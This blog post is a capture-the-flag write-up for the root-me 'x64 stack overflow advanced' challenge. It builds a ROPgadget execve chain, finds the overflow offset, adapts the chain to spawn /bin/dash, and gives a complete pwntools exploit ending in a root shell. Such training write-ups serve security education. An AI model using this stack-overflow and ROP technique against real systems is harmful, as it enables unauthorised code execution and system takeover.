---
layout: post
status: publish
published: true
title: root-me:x64 stack overflow advanced
author:
  display_name: SpeakSoftlyLove
  login: root
  email: foxwest@qq.com
  url: ''
author_login: root
author_email: foxwest@qq.com
wordpress_id: 311
wordpress_url: http://403forbidden.website/?p=311
date: '2017-11-29 16:41:23 +0800'
date_gmt: '2017-11-29 08:41:23 +0800'
categories:
- root-me
tags:
- root-me
comments: []
---
<h1>x64 stack overflow advanced</h1>
<h2>general</h2>
<p>its compile option:<br />
<code>gcc -o ch34 ch34.c -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static</code></p>
<p>universe  exploit method:</p>
<ul>
<li>leak a used function</li>
<li>calc offset with <code>libc.so</code> and the function to get <code>system</code> and <code>/bin/sh</code></li>
<li>ret2libc(when NX enabled) or write shellcode</li>
</ul>
<p>calc the truth address:</p>
<pre><code class="python">xxxx_got = libc.symbols['xxxx']
xxxx_addr = func_addr - (func_got - xxxx_got)
</code></pre>
<p>But in this program,static method was used to compile it,all the function address are static.</p>
<h2>step</h2>
<p>checksec:</p>
<pre><code>[*] '/mnt/hgfs/pwnexc/root-me/x64 stack overflow advanced/ch34'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>According to above analysis we can use rop gadgets:</p>
<pre><code class="bash"> ⚡ root@pwn  /mnt/hgfs/pwnexc/root-me/x64 stack overflow advanced  ROPgadget --binary ch34 --ropchain
</code></pre>
<p>get an universe rop chain:</p>
<pre><code class="python">#!/usr/bin/env python2
# execve generated by ROPgadget
from struct import pack

# Padding goes here
p = ''

p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0000) # @ .data
p += pack('<Q', 0x000000000044d2b4) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0008) # @ .data + 8
p += pack('<Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004016d3) # pop rdi ; ret
p += pack('<Q', 0x00000000006c0000) # @ .data  arg[0]
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0008) # @ .data + 8  arg[1]
p += pack('<Q', 0x0000000000437205) # pop rdx ; ret
p += pack('<Q', 0x00000000006c0008) # @ .data + 8  arg[2]
p += pack('<Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045b525) # syscall ; ret
</code></pre>
<p>calc the padding length:</p>
<pre><code>Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004010ec in main ()
gdb-peda$ pattern_offset A%JA%fA%5
A%JA%fA%5 found at offset: 280
</code></pre>
<p>So the padding length is 280.</p>
<p>Another question we have to mention is that on my computer <code>/bin/sh</code> is a soft link of <code>/bin/dash</code>,but on the pratice computer is not.I need to edit the rop chain to make it run <code>execve("/bin/dash",NULL,NULL)</code> instead of <code>execve("/bin/sh",NULL,NULL)</code></p>
<p>let's look at here:</p>
<pre><code class="python">p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0000) # @ .data
p += pack('<Q', 0x000000000044d2b4) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0008) # @ .data + 8
p += pack('<Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004016d3) # pop rdi ; ret
p += pack('<Q', 0x00000000006c0000) # @ .data
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0008) # @ .data + 8
p += pack('<Q', 0x0000000000437205) # pop rdx ; ret
p += pack('<Q', 0x00000000006c0008) # @ .data + 8
</code></pre>
<ul>
<li>extra <code>/</code> in string <code>/bin//sh</code> at <code>line 4</code> is used to be stack alignment,alse we can use <code>//bin/sh</code> to produce the same effect</li>
<li>string end <code>\0</code> is set at <code>line 7-9</code></li>
</ul>
<p>so we could devide <code>////////bin/dash</code> into two parts:<code>////////</code> and <code>bin/dash</code></p>
<pre><code># write first part
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0000) # @ .data
p += pack('<Q', 0x000000000044d2b4) # pop rax ; ret
p += '////////'# extra slash used to align
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret

# write second part
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0008) # @ .data + 8
p += pack('<Q', 0x000000000044d2b4) # pop rax ; ret
p += 'bin/dash'# extra slash used to align
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret

# add string end "<pre wp-pre-tag-6></pre>" at ".data + 16"
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0008) # @ .data + 8
p += pack('<Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret

# prepare arg of function `execve()`
p += pack('<Q', 0x00000000004016d3) # pop rdi ; ret
p += pack('<Q', 0x00000000006c0000) # @ .data   arg[0] *cmd
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0010) # @ .data + 16  arg[1] 0
p += pack('<Q', 0x0000000000437205) # pop rdx ; ret
p += pack('<Q', 0x00000000006c0010) # @ .data + 16  arg[2] 0
</code></pre>
<h2>exploit</h2>
<pre><code class="python">#!/usr/bin/env python2
# execve generated by ROPgadget 

from pwn import *
from struct import pack

DEBUG = 1
if DEBUG:
    proc = process('./ch34')
else:
    s = ssh(host='challenge03.root-me.org',
            user='app-systeme-ch34',
            password='app-systeme-ch34',
            port=2223)
    proc = s.process('./ch34')

# Padding goes here
p = 'A'*280

p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0000) # @ .data
p += pack('<Q', 0x000000000044d2b4) # pop rax ; ret
p += '////////'
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret

p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0008) # @ .data + 8
p += pack('<Q', 0x000000000044d2b4) # pop rax ; ret
p += 'bin/dash'
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c0010) # @ .data + 16
p += pack('<Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004016d3) # pop rdi ; ret
p += pack('<Q', 0x00000000006c0000) # @ .data
p += pack('<Q', 0x00000000004017e7) # pop rsi ; ret
p += p64(0)
p += pack('<Q', 0x0000000000437205) # pop rdx ; ret
p += p64(0)
p += pack('<Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045b525) # syscall ; ret

# gdb.attach(proc)
proc.sendline(p)
proc.interactive()
</code></pre>
<p>run it:</p>
<pre><code class="bash"> ⚡ root@pwn  /mnt/hgfs/pwnexc/root-me/x64 stack overflow advanced  python exp_ROPgadget.py 
[+] Starting local process './ch34': pid 5004
[*] Switching to interactive mode
Hex result: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141411b0100000c0100004141414141414141ffffffe71740
$ id
uid=0(root) gid=0(root) groups=0(root)
$  
</code></pre>
